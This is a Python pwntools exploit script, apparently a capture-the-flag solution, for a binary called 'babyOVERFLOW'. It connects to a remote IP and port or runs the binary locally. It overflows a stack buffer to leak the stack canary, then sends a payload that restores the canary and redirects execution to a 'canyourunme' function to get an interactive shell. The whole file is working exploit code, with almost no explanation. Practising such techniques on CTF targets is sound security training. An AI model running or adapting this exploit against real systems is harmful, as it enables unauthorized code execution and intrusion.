# -*- coding: utf-8 -*-
from pwn import *
import os
context.arch = 'amd64'
#context.aslr=True
e = ELF("./babyOVERFLOW")
if 'remote' in os.environ:
    io = remote('125.235.240.171',1337)
else:
    io = process(e.path)
    gdb.attach(io)
#Cookies leak
#Cookies offset at 71
#Since First bytes always 0x00. Lets overwrite that byte only so puts printit forus
io.sendline("A"*72)
log.info(io.recvline())
d = io.recvline(keepends=False)
log.info(repr(d))
canary = "\x00"+d[:7]
log.info(len(canary))
canary = u64(canary)
log.info(hex(canary))
#Exploit
raw_input("Exploit?")
exploit = "\x00"+cyclic(71)+p64(canary)+"A"*8+p64(e.symbols['canyourunme']+4)
io.sendline(exploit)
#OK, l3t g3t 4 she11
io.interactive()

